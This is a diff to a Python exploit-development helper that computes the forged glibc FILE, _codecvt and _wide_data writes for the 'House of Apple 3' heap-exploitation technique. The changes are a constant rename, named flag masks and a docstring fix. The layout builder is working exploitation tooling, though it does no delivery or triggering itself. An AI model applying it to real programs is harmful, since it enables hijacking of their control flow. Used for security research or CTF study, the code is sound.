@@ -5,7 +5,7 @@ from __future__ import annotations
 from dataclasses import dataclass
 
 
-FILE_CODECvt = 0x98
+FILE_CODECVT = 0x98
 FILE_WIDE_DATA = 0xA0
 FILE_FLAGS = 0x00
 FILE_READ_BASE = 0x08
@@ -18,6 +18,9 @@ WIDE_READ_END = 0x08
 WIDE_READ_BASE = 0x10
 WIDE_BUF_BASE = 0x30
 WIDE_BUF_END = 0x38
+FLAG_EOF_SEEN = 0x10
+FLAG_NO_READS = 0x4
+_CLEAR_FOR_WIDE_INPUT = FLAG_EOF_SEEN | FLAG_NO_READS
 
 CODEC_LAYOUTS = {
     "2.23": ("legacy", 0x18),
@@ -87,8 +90,8 @@ def build_house_of_apple3(
     """Build the codecvt callback layout shown by this directory's PoCs.
 
     The callback is called by ``fgetwc`` after the caller has placed the FILE
-    object in wide mode. The returned writes do not perform the FILE投递 or
-    trigger; they only describe the fields consumed by the ABI-specific sink.
+    object in wide mode. The returned writes do not perform the FILE delivery
+    or trigger; they only describe the fields consumed by the ABI-specific sink.
     """
 
     layout, callback_offset = _layout(version)
@@ -104,7 +107,7 @@ def build_house_of_apple3(
         _uint(name, value)
 
     writes: list[MemoryWrite] = [
-        _write(file_addr + FILE_CODECvt, _ptr("fake_codecvt_addr", fake_codecvt_addr), "FILE._codecvt"),
+        _write(file_addr + FILE_CODECVT, _ptr("fake_codecvt_addr", fake_codecvt_addr), "FILE._codecvt"),
         _write(file_addr + FILE_WIDE_DATA, _ptr("wide_data_addr", wide_data_addr), "FILE._wide_data"),
         _write(file_addr + FILE_MODE, (1).to_bytes(4, "little"), "FILE._mode"),
         _write(file_addr + FILE_READ_BASE, _ptr("external_input_addr", external_input_addr), "FILE._IO_read_base"),
@@ -113,7 +116,13 @@ def build_house_of_apple3(
     ]
     if current_flags is not None:
         _uint("current_flags", current_flags, 32)
-        writes.append(_write(file_addr + FILE_FLAGS, (current_flags & ~(0x10 | 0x4)).to_bytes(4, "little"), "FILE._flags"))
+        writes.append(
+            _write(
+                file_addr + FILE_FLAGS,
+                (current_flags & ~_CLEAR_FOR_WIDE_INPUT).to_bytes(4, "little"),
+                "FILE._flags",
+            )
+        )
 
     wide = _image(
         0x40,
